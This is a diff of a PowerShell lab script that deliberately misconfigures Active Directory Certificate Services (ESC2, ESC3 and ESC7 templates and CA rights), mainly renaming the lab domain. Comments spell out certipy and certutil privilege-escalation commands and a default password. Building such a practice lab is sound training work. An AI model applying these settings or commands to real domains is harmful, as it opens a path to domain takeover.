@@ -10,15 +10,15 @@
 #   ESC3 — EnrollmentAgentTemplate: Certificate Request Agent EKU, Domain Users enroll
 #   ESC7 — carol.white gets Manage CA + Manage Certificates on the CA object
 #
-# LAB USE ONLY
+# TURBO USE ONLY
 # =============================================================================
 [CmdletBinding()]
 param()
 
 $ErrorActionPreference = "Continue"
 
-$domain      = $env:DOMAIN       # lab.local
-$domainShort = $env:DOMAIN_SHORT  # LAB
+$domain      = $env:DOMAIN       # turbo.lab
+$domainShort = $env:DOMAIN_SHORT  # TURBO
 $adminPass   = $env:ADMIN_PASS    # Vagrant123!
 
 Import-Module ActiveDirectory
@@ -73,7 +73,7 @@ function Copy-TemplateAttributes {
 #   - Client authentication (get TGT via PKINIT)
 #   - Sub-CA operations
 #   - Any extended key usage
-# Attack: certipy req -ca LAB-CA -template AnyPurposeTemplate -upn administrator@lab.local
+# Attack: certipy req -ca LAB-CA -template AnyPurposeTemplate -upn administrator@turbo.lab
 Write-Host "[*] Creating ESC2 template (AnyPurposeTemplate)..."
 $esc2Name = "AnyPurposeTemplate"
 $esc2DN   = "CN=$esc2Name,$templatesDN"
@@ -155,7 +155,7 @@ if (-not ([adsi]::Exists("LDAP://$esc3DN"))) {
 # With Manage Certificates: can approve pending certificate requests → bypass manager approval
 # Attack:  certipy ca -ca LAB-CA -add-officer carol.white    (if only ManageCert)
 #          certipy ca -ca LAB-CA -enable-template User       (if ManageCA)
-#          certutil -config DC01.lab.local\LAB-CA -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+#          certutil -config DC01.turbo.lab\LAB-CA -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 Write-Host "[*] Granting carol.white Manage CA + Manage Certificates (ESC7)..."
 try {
     # Use certutil to add carol.white as CA officer (Manage Certificates)
